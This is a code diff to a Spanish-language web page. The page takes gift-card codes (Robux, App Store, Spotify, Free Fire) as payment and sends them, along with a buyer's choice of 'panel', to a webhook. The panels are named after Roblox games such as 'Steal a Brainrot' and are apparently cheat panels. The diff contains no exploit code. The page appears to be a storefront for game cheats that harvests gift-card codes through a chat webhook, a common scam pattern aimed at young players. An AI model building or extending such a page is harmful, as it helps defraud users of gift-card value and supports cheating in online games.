@@ -103,6 +103,57 @@
   .gift-panel { display: none; margin-top: 12px; }
   .gift-panel.abierto { display: block; }
   .gift-panel input { margin-bottom: 10px; font-size: 16px; letter-spacing: .5px; }
+  #panel-acceso { display: none; min-height: 100vh; padding: 24px; }
+  .panel-wrap { max-width: 520px; margin: 0 auto; }
+  .panel-titulo {
+    font-size: 17px;
+    line-height: 1.4;
+    text-align: center;
+    margin: 0 0 20px;
+  }
+  .panel-titulo span { display: block; font-size: 12px; color: #ff6b6b; font-weight: 400; margin-top: 6px; letter-spacing: .5px; }
+  .panel-btn {
+    display: block;
+    width: 100%;
+    margin-bottom: 10px;
+    padding: 14px 16px;
+    background: #1a1a22;
+    border: 1px solid #2c2c38;
+    border-radius: 14px;
+    color: #f2f2f5;
+    font-weight: 700;
+    font-size: 15px;
+    letter-spacing: 1px;
+    cursor: pointer;
+  }
+  .panel-btn.sel { border-color: #5865F2; background: #23233080; }
+  #panel-msg { font-size: 13px; min-height: 18px; margin: 4px 0 14px; text-align: center; }
+  #panel-msg.ok { color: #43b581; }
+  #panel-msg.err { color: #ff6b6b; }
+  .volver {
+    display: block;
+    width: 100%;
+    padding: 14px 16px;
+    background: transparent;
+    border: 1px solid #2c2c38;
+    border-radius: 14px;
+    color: #9a9aa8;
+    font-weight: 700;
+    font-size: 14px;
+    letter-spacing: 1px;
+    cursor: pointer;
+  }
+  .gift-panel select {
+    width: 100%;
+    margin-bottom: 10px;
+    padding: 12px 14px;
+    border-radius: 10px;
+    font-size: 16px;
+    border: 1px solid #2c2c38;
+    background: #0f0f14;
+    color: #f2f2f5;
+  }
+  .gift-aviso { font-size: 12px; color: #9a9aa8; letter-spacing: .3px; margin-bottom: 10px; text-align: center; }
   .gift-enviar { margin-top: 2px; background: #5865F2; font-weight: 700; letter-spacing: 1px; }
   #gift-msg { font-size: 13px; min-height: 18px; margin-top: 8px; text-align: center; letter-spacing: 0; }
   #gift-msg.ok { color: #43b581; }
@@ -155,17 +206,35 @@
   </a>
   <button type="button" class="pagos" id="pagos">MÉTODOS DE PAGO</button>
   <ul class="lista-pagos" id="lista-pagos">
-    <li>PAYPAL</li>
     <li id="gift-item">
       <div class="gift-titulo" id="gift-titulo">GIFT CARDS</div>
       <div class="gift-panel" id="gift-panel">
+        <div class="gift-aviso">SOLO SE ACEPTA ROBUX, APP STORE, SPOTIFY, FREE FIRE</div>
         <input type="text" id="gift-codigo" placeholder="INSERTA EL CÓDIGO DE LA GIFT CARD" autocomplete="off">
-        <input type="text" id="gift-tipo" placeholder="DE QUE ES TU TARJETA" autocomplete="off">
+        <select id="gift-tipo">
+          <option value="" disabled selected>DE QUE ES TU TARJETA</option>
+          <option value="ROBUX">ROBUX</option>
+          <option value="APP STORE">APP STORE</option>
+          <option value="SPOTIFY">SPOTIFY</option>
+          <option value="FREE FIRE">FREE FIRE</option>
+        </select>
+        <div class="gift-aviso">SE REVISARÁ LA SOLICITUD. TIEMPO APROXIMADO DE ESPERA: 1 HORA - 1 DÍA</div>
         <button type="button" class="gift-enviar" id="gift-enviar">ENVIAR</button>
         <div id="gift-msg"></div>
       </div>
     </li>
   </ul>
+</main>
+
+<main id="panel-acceso">
+  <div class="panel-wrap">
+    <h2 class="panel-titulo">¿A QUÉ PANEL TE GUSTARÍA TENER ACCESO?<br><span>(ESTA OPCIÓN NO ES REVERSIBLE)</span></h2>
+    <button type="button" class="panel-btn" data-panel="ROBA UN HUEVO">ROBA UN HUEVO</button>
+    <button type="button" class="panel-btn" data-panel="STEAL A BRAINROT">STEAL A BRAINROT</button>
+    <button type="button" class="panel-btn" data-panel="BLOCK SPIN">BLOCK SPIN</button>
+    <div id="panel-msg"></div>
+    <button type="button" class="volver" id="volver">VOLVER</button>
+  </div>
 </main>
 
 <script>
@@ -250,12 +319,46 @@
       document.getElementById("gift-tipo").value = "";
       msg.className = "ok";
       msg.textContent = "Enviado";
+      document.getElementById("contenido").style.display = "none";
+      document.getElementById("panel-acceso").style.display = "block";
     })
     .catch(function () {
       msg.className = "err";
       msg.textContent = "No se pudo enviar, intenta de nuevo";
     })
     .finally(function () { btn.disabled = false; });
+  });
+
+  let panelElegido = false;
+  document.querySelectorAll(".panel-btn").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      if (panelElegido) return;
+      panelElegido = true;
+      document.querySelectorAll(".panel-btn").forEach(function (b) { b.classList.remove("sel"); b.disabled = true; });
+      btn.classList.add("sel");
+      const pmsg = document.getElementById("panel-msg");
+      pmsg.className = "ok";
+      pmsg.textContent = "Elegiste: " + btn.dataset.panel;
+
+      fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          allowed_mentions: { parse: [] },
+          embeds: [{
+            title: "Panel elegido",
+            color: 5793266,
+            fields: [{ name: "Panel", value: btn.dataset.panel }],
+            timestamp: new Date().toISOString()
+          }]
+        })
+      }).catch(function () {});
+    });
+  });
+
+  document.getElementById("volver").addEventListener("click", function () {
+    document.getElementById("panel-acceso").style.display = "none";
+    document.getElementById("contenido").style.display = "block";
   });
 
   // Bloquear zoom / cambio de tamaño
